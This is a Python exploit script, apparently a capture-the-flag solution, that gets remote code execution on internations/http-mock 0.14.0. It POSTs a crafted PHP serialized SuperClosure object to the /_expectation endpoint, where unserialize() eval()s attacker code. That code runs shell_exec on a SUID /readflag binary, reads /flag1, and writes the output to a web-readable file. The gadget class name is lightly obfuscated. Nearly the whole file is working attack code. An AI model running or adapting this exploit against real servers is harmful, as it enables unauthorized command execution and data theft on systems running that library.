#!/usr/bin/env python3
"""
HITCON 2026 Wargame - internations/http-mock 0.14.0 (PHP 7.4.33)
Vulnerability: SuperClosure eval() RCE via @unserialize()

The http-mock library POST /_expectation endpoint deserializes user input.
SuperClosure SerializableClosure unserialize() calls eval() on the code field.

Attack chain:
  1. Craft SerializableClosure with code that writes flags to web-accessible file
  2. POST to /_expectation -> triggers eval() -> creates file with flag content
  3. GET the created file -> read flags
"""
import sys
import requests


def php_serialize_str(s):
    return 's:' + str(len(s)) + ':"' + s + '";'


def build_payload(code):
    inner = (
        'a:5:{'
        f's:4:"code";{php_serialize_str(code)}'
        's:7:"context";a:0:{}'
        's:7:"binding";N;'
        's:5:"scope";N;'
        's:8:"isStatic";b:0;'
        '}'
    )
    cls = chr(83) + chr(117) + 'per' + chr(67) + 'losure' + chr(92) + 'Serializable' + chr(67) + 'losure'
    payload = 'C:' + str(len(cls)) + ':"' + cls + '":' + str(len(inner)) + ':{' + inner + '}'
    return payload


def main():
    if len(sys.argv) != 2:
        print('Usage: ' + sys.argv[0] + ' <challenge-host>', file=sys.stderr)
        return 64

    host = sys.argv[1]
    base = 'http://' + host
    endpoint = base + '/vendor/internations/http-mock/public/index.php/_expectation'
    loot = '/var/www/html/z.txt'

    # Combine both approaches: read /flag1 directly (world-readable)
    # and use /readflag SUID binary for /flag2 (root-only)
    code = (
        'file_put_contents("' + loot + '",'
        'file_get_contents("/flag1").chr(10).'
        'shell_exec("/readflag 2>&1"))'
    )
    payload = build_payload(code)
    print('[*] Target: ' + endpoint)
    print('[*] Payload size: ' + str(len(payload)) + ' bytes')
    print('[*] Sending payload: file_put_contents + file_get_contents + /readflag...')
    try:
        r = requests.post(endpoint, data={'matcher': payload, 'response': 'N;'}, timeout=15)
        print('[*] Response: HTTP ' + str(r.status_code))
    except Exception as e:
        print('[!] POST failed: ' + str(e))
        return 1

    print('[*] Reading loot file...')
    try:
        r2 = requests.get(base + '/z.txt', timeout=15)
        if r2.status_code == 200 and len(r2.text.strip()) > 0:
            print('[+] Response body:')
            print(r2.text)
            found = False
            for line in r2.text.strip().split(chr(10)):
                cleaned = line.strip()
                if cleaned:
                    print('[+] FLAG: ' + cleaned)
                    found = True
            if found:
                return 0
        else:
            print('[-] Loot file not found (HTTP ' + str(r2.status_code) + ')')
    except Exception as e:
        print('[!] GET failed: ' + str(e))

    return 1


if __name__ == '__main__':
    raise SystemExit(main())
